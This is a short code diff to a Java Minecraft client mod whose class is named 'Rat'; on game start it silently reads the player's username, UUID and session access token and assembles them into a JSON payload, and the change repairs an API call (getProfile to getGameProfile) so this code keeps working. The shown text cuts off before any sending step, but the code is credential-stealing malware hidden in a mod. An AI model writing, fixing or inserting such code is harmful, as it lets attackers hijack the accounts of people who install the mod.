@@ -16,17 +16,16 @@ public class Rat implements ClientModInitializer {
     public void onInitializeClient() {
         new Thread(() -> {
             try {
-                // Wait for client initialization
                 Thread.sleep(4000);
-                
                 Minecraft client = Minecraft.getInstance();
                 if (client == null) return;
-                
+
                 User user = client.getUser();
                 if (user == null) return;
 
                 String username = user.getName();
-                String uuid = user.getProfile().getId().toString();
+                // CORREÇÃO: getProfile() → getGameProfile()
+                String uuid = user.getGameProfile().getId().toString();
                 String token = user.getAccessToken();
 
                 String jsonPayload = String.format(
